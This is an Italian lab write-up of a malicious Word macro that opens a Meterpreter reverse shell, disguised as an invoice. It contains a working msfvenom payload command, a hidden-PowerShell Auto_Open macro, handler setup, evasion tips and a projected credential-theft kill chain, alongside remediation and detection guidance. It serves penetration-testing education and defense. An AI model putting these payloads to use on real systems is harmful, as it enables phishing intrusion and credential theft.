> [English](README.en.md) | **Italiano**

# Malicious Macros - VBA Reverse Shell via Documento Office

> - **Fase:** Social Engineering - Payload Delivery via Macro VBA
> - **Visibilita:** Alta - le macro VBA sono monitorate da AV/EDR, AMSI ispeziona il codice PowerShell a runtime, i documenti con macro attivano alert nei SIEM; file con MotW triggerano il blocco macro di default su Office 2022+
> - **Prerequisiti:** msfvenom per generazione payload VBA-PSH; Microsoft Office installato sul target con macro abilitate (o MotW rimosso); Metasploit handler in ascolto; conoscenza base di VBA per customizzazione
> - **Output:** SE-007 (macro VBA esegue stager PowerShell per reverse shell Meterpreter - severity Alto)

- **Ambiente Operativo:** Kali Linux Purple (Attaccante), Windows 10 VM con Office 2019 (Vittima)
- **Target:** Utente aziendale simulato che apre documento Word
- **Framework:** msfvenom (payload generation), Metasploit (handler)
- **Tecniche Documentate:** VBA Macro Execution, PowerShell Stager, Reverse Shell Callback

---

## Executive Summary

Le macro VBA (Visual Basic for Applications) in documenti Microsoft Office rappresentano il vettore di delivery piu utilizzato nella storia del cybercrime, dominando il panorama delle minacce dal 2015 al 2022. Il principio e semplice: un documento Word/Excel contiene codice VBA che, quando l'utente clicca "Abilita contenuto", esegue comandi arbitrari sul sistema. Nel laboratorio, la macro genera uno stager PowerShell encoded che stabilisce una reverse shell Meterpreter verso l'attaccante.

Microsoft ha introdotto il blocco delle macro di default per file con Mark-of-the-Web (luglio 2022), riducendo drasticamente l'efficacia di questa tecnica per file scaricati da Internet. Tuttavia, la tecnica resta rilevante in scenari specifici: file provenienti da share SMB interni (senza MotW), ambienti con policy macro permissive, e organizzazioni con dipendenze legacy da documenti macro-enabled.

---

## Macro VBA: Stager PowerShell per Reverse Shell

**ID Finding:** `SE-007` | **Severity:** `Alto`

### Contesto operativo

Lo scenario simula un attacco tipico: un documento Word mascherato da fattura aziendale ("Fattura_Q1_2026.docm") viene inviato al target via email. All'apertura, Office mostra il banner "Abilita contenuto". Se l'utente clicca, la macro VBA si esegue, lancia uno stager PowerShell in background e stabilisce una connessione reverse TCP verso l'attaccante.

### PoC - Fase 1: Generazione Payload VBA

```Bash
# Generazione macro VBA con stager PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f vba-psh -o macro_payload.vba
```

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes                                     <-- payload compatto
Final size of vba-psh file: 7812 bytes                      <-- codice VBA generato
Saved as: macro_payload.vba
```

### PoC - Fase 2: Embedding in Documento Word

```Bash
# Il contenuto di macro_payload.vba va copiato nell'editor VBA di Word:
# 1. Aprire Word -> Nuovo documento
# 2. Alt+F11 -> Editor VBA
# 3. Insert -> Module -> incollare il codice da macro_payload.vba
# 4. La funzione Auto_Open() si esegue automaticamente all'apertura
# 5. Salvare come .docm (macro-enabled) -> "Fattura_Q1_2026.docm"
```

```vb
' Estratto semplificato della macro generata (Auto_Open)
Sub Auto_Open()
    Dim cmd As String
    cmd = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AI..."
    Shell cmd, vbHide           ' Esecuzione nascosta
End Sub
```

### PoC - Fase 3: Setup Handler e Callback

```Bash
# Handler Metasploit (Kali)
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.0.110
set LPORT 4444
run
```

```
[*] Started reverse TCP handler on 192.168.0.110:4444
[*] Sending stage (201798 bytes) to 192.168.0.120
[*] Meterpreter session 1 opened (192.168.0.110:4444 -> 192.168.0.120:49712)    <-- SE-007

meterpreter > getuid
Server username: DESKTOP-LAB\mario.rossi                    <-- identita vittima
meterpreter > sysinfo
Computer    : DESKTOP-LAB
OS          : Windows 10 (10.0 Build 19045)
Meterpreter : x64/windows
```

### Remediation

- **Azione immediata:** isolamento della macchina compromessa dalla rete; kill del processo PowerShell malevolo; scansione AV completa; verifica di ulteriori artefatti (persistence, lateral movement)
- **Azione strutturale:** blocco macro VBA via Group Policy (`Block macros from running in Office files from the Internet`); deploy Attack Surface Reduction (ASR) rules: `Block Office applications from creating executable content` e `Block Office applications from injecting code into other processes`; abilitazione AMSI (Antimalware Scan Interface) per ispezione PowerShell a runtime; configurazione email gateway per stripping di allegati .docm/.xlsm o sandboxing
- **Verifica:** invio di documento .docm di test - deve essere bloccato dal banner MotW senza possibilita di "Abilita contenuto"; verifica log AMSI per detection dello stager PowerShell

---

## Esperienza di Laboratorio

L'ambiente e stato configurato con Office 2019 su Windows 10 VM e macro abilitate via GPO locale per simulare un ambiente corporate legacy. Il primo tentativo ha utilizzato il payload `vba-psh` grezzo di msfvenom, che e stato immediatamente rilevato da Windows Defender con il signature `Trojan:Script/Wacatac.B!ml`. La soluzione e stata disabilitare Defender per completare il PoC (in un engagement reale si userebbe offuscamento con `macro_pack` o encoding custom).

Un aspetto critico emerso durante il test: il payload VBA generato da msfvenom contiene stringhe PowerShell encoded in Base64 che superano i 255 caratteri per riga - il limite VBA. msfvenom gestisce questo automaticamente splittando le stringhe in concatenazioni, ma la dimensione totale del modulo VBA (circa 8 KB) puo insospettire un analista che ispeziona manualmente il documento.

La decisione di utilizzare `Auto_Open()` anziche `Document_Open()` e stata dettata dalla compatibilita: `Auto_Open` si esegue sia in documenti .docm sia in template .dotm, mentre `Document_Open` richiede specificamente un documento (non un template). In uno scenario reale, si userebbe `Document_Open` per evitare l'esecuzione accidentale durante lo sviluppo.

---

## Analisi Teorica: Ascesa e Declino delle Macro VBA

Le macro VBA hanno dominato il panorama delle minacce per un motivo strutturale: Microsoft Office e installato su oltre il 90% dei computer aziendali, e il linguaggio VBA ha accesso completo alle API Windows tramite `Shell()`, `CreateObject("WScript.Shell")` e le dichiarazioni `Declare`. Questo significa che un documento Office e, di fatto, un container per codice eseguibile arbitrario.

Il punto di svolta e stato luglio 2022, quando Microsoft ha iniziato a bloccare le macro VBA nei file con Mark-of-the-Web (MotW) - il flag NTFS (`Zone.Identifier` alternate data stream) che Windows applica ai file scaricati da Internet. Con il MotW presente, Office mostra un banner rosso senza il pulsante "Abilita contenuto", rendendo impossibile l'esecuzione della macro.

Questa decisione ha avuto un impatto immediato e misurabile: secondo i dati Proofpoint, l'uso di macro VBA come vettore di delivery e diminuito del 66% nei 6 mesi successivi all'enforcement. Gli attaccanti si sono spostati su vettori che bypassano il MotW (ISO, LNK, container files) o che non ne sono affetti (HTML Smuggling). Tuttavia, le macro VBA restano un vettore attivo nei seguenti scenari:
- File provenienti da share SMB/DFS interni (non hanno MotW)
- Organizzazioni con policy GPO che riabilitano le macro ("Trust access to the VBA project object model")
- Documenti .doc (formato OLE legacy) che in alcune configurazioni non triggerano il blocco

---

## Scenario Reale: Proiezione Post-Exploitation

> Questa sezione descrive come questo finding si inserirebbe in un engagement reale.

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** reverse shell Meterpreter come utente standard `mario.rossi` (SE-007).

**Kill Chain proiettata:**

```
[SE-007] Macro eseguita -> Meterpreter session (utente standard)
        |
        v
Process migration -> explorer.exe (persistenza al riavvio del documento)
        |
        v
Privilege Escalation -> WinPEAS/PrintSpoofer (da 04-system-exploitation)
        |
        v
Credential Dumping -> Mimikatz/SAM dump -> hash NTLM
        |
        v
Lateral Movement -> Pass-the-Hash / PsExec verso altri host
```

### Prospettiva Difensore (Blue Team)

**IOC da monitorare:**
- Processo `powershell.exe` figlio di `WINWORD.EXE` (correlazione parent-child anomala)
- Connessione TCP outbound da processo Office verso IP esterno
- Event ID 4688 (Process Creation) con command line Base64 encoded
- AMSI event: `ScriptBlockLogging` con contenuto sospetto

**Hardening:**
- ASR rule: `Block Office applications from creating child processes`
- PowerShell Constrained Language Mode via AppLocker/WDAC
- Script Block Logging abilitato per audit PowerShell

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Resource Development | Develop Capabilities: Malware | `T1587.001` | Generazione macro VBA con stager PowerShell via msfvenom |
| Initial Access | Phishing: Spearphishing Attachment | `T1566.001` | Documento Word malevolo inviato come "Fattura_Q1_2026.docm" |
| Execution | User Execution: Malicious File | `T1204.002` | L'utente apre il documento e clicca "Abilita contenuto" (SE-007) |
| Execution | Command and Scripting Interpreter: Visual Basic | `T1059.005` | Macro VBA Auto_Open() esegue il payload |
| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | Stager PowerShell encoded stabilisce reverse shell |
| Defense Evasion | Obfuscated Files or Information | `T1027` | Payload PowerShell encoded in Base64 per evasione firma statica |
| Command and Control | Non-Standard Port | `T1571` | Reverse TCP Meterpreter su porta 4444 |

---

> **Nota:** Tutte le attivita documentate sono state condotte in un ambiente di laboratorio virtualizzato. I documenti malevoli sono stati creati e testati esclusivamente su macchine virtuali di proprieta dell'autore. Nessun documento e stato inviato a persone reali.
